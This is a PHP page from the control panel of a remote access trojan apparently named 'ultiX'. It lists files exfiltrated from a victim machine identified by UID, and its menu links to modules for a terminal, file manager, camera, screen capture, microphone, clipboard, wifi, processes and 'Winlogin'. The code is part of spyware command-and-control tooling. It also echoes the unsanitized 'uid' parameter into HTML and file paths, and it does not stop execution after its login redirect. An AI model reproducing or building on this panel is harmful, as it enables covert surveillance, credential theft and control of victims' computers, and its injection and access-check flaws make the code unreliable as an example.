<?php
require_once "../session.php";

$agent_UID = $_GET["uid"];

if (!is_login()) {
    header("Location: ../login.php");
}
if ($agent_UID == "") {
    header('Location: ../index.php');
}
 
?>

<!DOCTYPE html>
<html lang="en">
   <head>
      <meta charset="UTF-8" />
      <meta http-equiv="X-UA-Compatible" content="IE=edge" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      <link rel="stylesheet" href="../css/bootstrap.min.css" />
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css"/>
      <script src="../js/bootstrap.bundle.min.js"></script>
      <script src="https://cdn.jsdelivr.net/npm/chart.js@3.0.2/dist/chart.min.js"></script>
      <script src="../js/jquery-3.5.1.js"></script>
      <script src="../js/jquery.dataTables.min.js"></script>
      <script src="../js/dataTables.bootstrap5.min.js"></script>
      <script src="../js/script.js"></script>
      <link rel="stylesheet" href="../css/dataTables.bootstrap5.min.css" />
      <link rel="stylesheet" href="../css/style.css" />
      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
      <title>ultiX - Control Panel</title>
   </head>
   <body>
      <!-- top navigation bar -->
      <nav class="navbar navbar-expand-lg navbar-dark bg-dark fixed-top">
         <div class="container-fluid">
            <button
               class="navbar-toggler"
               type="button"
               data-bs-toggle="offcanvas"
               data-bs-target="#sidebar"
               aria-controls="offcanvasExample"
               >
            <span class="navbar-toggler-icon" data-bs-target="#sidebar"></span>
            </button>
            <a
               class="navbar-brand me-auto ms-lg-0 ms-3 text-uppercase fw-bold"
               href="#"
               >ultiX - Panel</a
               >
            </form>

         </div>
      </nav>
      <!-- top navigation bar -->
      <!-- offcanvas -->
      <div
         class="offcanvas offcanvas-start sidebar-nav bg-dark"
         tabindex="-1"
         id="sidebar"
         >
         <div class="offcanvas-body p-0">
            <nav class="navbar-dark">
               <ul class="navbar-nav">
                  <li>
                     <div class="text-muted small fw-bold text-uppercase px-3">
                        Panel
                     </div>
                  </li>
                  <li>
                     <a href="../index.php" class="nav-link px-3  active">
                     <span class="me-2"><i class="bi bi-speedometer2"></i></span>
                     <span>Dashboard</span>
                     </a>
                     <a href="../statics.php" class="nav-link px-3">
                     <span class="me-2"><i class="bi bi-bar-chart-line-fill"></i></span>
                     <span>Statics</span>
                     </a>
                  </li>
                  <li class="my-2">
                     <hr class="dropdown-divider bg-light" />
                  </li>
                  <li>
                     <div class="text-muted small fw-bold text-uppercase px-3">
                        Author
                     </div>
                     <a href="https://github.com/Vczz0/" class="nav-link px-3">
                     <span class="me-2"> <i class="bi bi-info-circle-fill"></i> </span>
                     <span>RealDutch7</span>
                     </a>
                  </li>
               </ul>
            </nav>
         </div>
      </div>
      <!-- offcanvas -->
      <main class="main mt-5 pt-3">
         <div class="container-fluid">
            <div class="col-md-12 mb-3">
               <div class="row">
                  <div class="col-sm-4">
                     <div class="card">
                        <div class="card-body">
                           <h2>Select Module</h2>
                           <?php echo "Modules for: $agent_UID"?>
                           <button onclick="location.href='../index.php'"type="button" class="btn btn-success"> <i class="bi bi-arrow-90deg-left"></i> GoBack</button>
                           <button type="button" onclick="refPage()"class="btn btn-success"> <i class="bi bi-arrow-clockwise"></i> Refresh Page</button>
                           <hr class="my-2">
                           <div class="list-group">
                              <?php echo '<a href="systeminfo.php?uid='.$agent_UID.'"'.'class="list-group-item list-group-item-action px-3 border-0 ripple"> <i class="bi bi-info-circle"></i> System-Info</a>'?>
                              <?php echo '<a href="terminal.php?uid='.$agent_UID.'"'.'class="list-group-item list-group-item-action px-3 border-0 ripple"> <i class="bi bi-terminal"></i> Terminal</a>'?>
                              <?php echo '<a href="filemanager.php?uid='.$agent_UID.'"'.'class="list-group-item list-group-item-action px-3 border-0 ripple"> <i class="bi bi-folder"></i> Files</a>'?>
                              <?php echo '<a href="#" class="list-group-item list-group-item-action px-3 border-0 ripple active"> <i class="bi bi-cloud-arrow-down"></i> Downloaded Files'?>
                              <?php echo '<a href="cameracapture.php?uid='.$agent_UID.'"'.'class="list-group-item list-group-item-action px-3 border-0 ripple"> <i class="bi bi-camera"></i> Camera</a>'?>
                              <?php echo '<a href="screencapture.php?uid='.$agent_UID.'"'.'class="list-group-item list-group-item-action px-3 border-0 ripple"> <i class="bi bi-image"></i> ScreenCapture</a>'?>
                              <?php echo '<a href="microphone.php?uid='.$agent_UID.'"'.'class="list-group-item list-group-item-action px-3 border-0 ripple"> <i class="bi bi-mic"></i> Microphone</a>'?>
                              <?php echo '<a href="ShutdownReboot.php?uid='.$agent_UID.'"'.'class="list-group-item list-group-item-action px-3 border-0 ripple"> <i class="bi bi-plug"></i> Shutdown / Reboot</a>'?>
                              <?php echo '<a href="clipboard.php?uid='.$agent_UID.'"'.'class="list-group-item list-group-item-action px-3 border-0 ripple"> <i class="bi bi-clipboard"></i> Clipboard</a>'?>
                              <?php echo '<a href="wifi.php?uid='.$agent_UID.'"'.'class="list-group-item list-group-item-action px-3 border-0 ripple"> <i class="bi bi-wifi"></i> Wifi</a>'?>
                              <?php echo '<a href="processes.php?uid='.$agent_UID.'"'.'class="list-group-item list-group-item-action px-3 border-0 ripple"> <i class="bi bi-cpu"></i> Active Processes</a>'?>
                              <?php echo '<a href="windowText.php?uid='.$agent_UID.'"'.'class="list-group-item list-group-item-action px-3 border-0 ripple"> <i class="bi bi-window"></i> Window Text</a>'?>
                              <?php echo '<a href="winlogin.php?uid='.$agent_UID.'"'.'class="list-group-item list-group-item-action px-3 border-0 ripple"> <i class="bi bi-box-arrow-in-right"></i> Winlogin</a>'?>
                              <?php echo '<a href="messagebox.php?uid='.$agent_UID.'"'.'class="list-group-item list-group-item-action px-3 border-0 ripple"> <i class="bi bi-chat-left-dots"></i> Messagebox</a>'?>
                           </div>
                        </div>
                     </div>
                  </div>
                  <div class="col">
                     <div class="row">
                        <div class="col">
                           <div class="card">
                                <div class="card-body">
                                    <h2> <i class="bi bi-cloud-arrow-down"></i> Downloaded Files</h2>
                                    <hr class="my-2">
                                    <table class="table data-table table-bordered table-hover" id="">
                                          <thead>
                                             <tr>
                                                <th scope="col">Time</th>
                                                <th scope="col">File Type</th>
                                                <th scope="col">File Name</th>
                                             </tr>
                                          </thead>
                                          <tbody>
                                          <?php
                                            $uid_files_folder = "../../ultiX-Data/".$agent_UID."/downloadedFiles";
                                            $file = scandir($uid_files_folder);
                                            foreach($file as $File) {
                                                if ($File != ".." && $File != "."){
                                                    $Filename1 = explode('downloadedFiles/', $File);
                                                    $fileName = explode('Fn', $File);
                                                    $firstDateFile = str_replace(".png", "", $Filename1[0]);
                                                    $datetime = substr($firstDateFile, 0, strpos($firstDateFile, "Fn"));
                                                    echo "<tr>";
                                                    echo '<td>'.$datetime.'</td>';

                                                    if (strpos($File, ".png") or (strpos($File, ".jpg")) ) {
                                                        echo '<td> <i class="bi bi-image"></i> Image </td>';
                                                        echo '<td>'.'<a href="../../ultiX-Data/'.$agent_UID. "/downloadedFiles/".$File.'"'.'>'.$fileName[1].'</a>'.'</td>';
                                                    } else if (strpos($File, ".txt")) {
                                                        echo '<td> <i class="bi bi-fonts"></i> Text </td>';
                                                        echo '<td>'.'<a href="../../ultiX-Data/'.$agent_UID. "/downloadedFiles/".$File.'"'.'>'.$fileName[1].'</a>'.'</td>';
                                                    } else if (strpos($File, ".mp4")) {
                                                        echo '<td> <i class="bi bi-file-earmark-play-fill"></i> Video </td>';
                                                        echo '<td>'.'<a href="../../ultiX-Data/'.$agent_UID. "/downloadedFiles/".$File.'"'.'>'.$fileName[1].'</a>'.'</td>';
                                                    } else{
                                                        echo '<td> <i class="bi bi-file-binary"></i> Unsuported file type</td>';
                                                        echo '<td>'.'<a href="../../ultiX-Data/'.$agent_UID. "/downloadedFiles/".$File.'"'.'>'.$fileName[1].'</a>'.'</td>';

                                                    }
                                                    echo "</tr>";

                                                } 
                                            }
                                          ?>
                                          </tbody>
                                       </table>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
         </div>
      </main>
   </body>
</html>
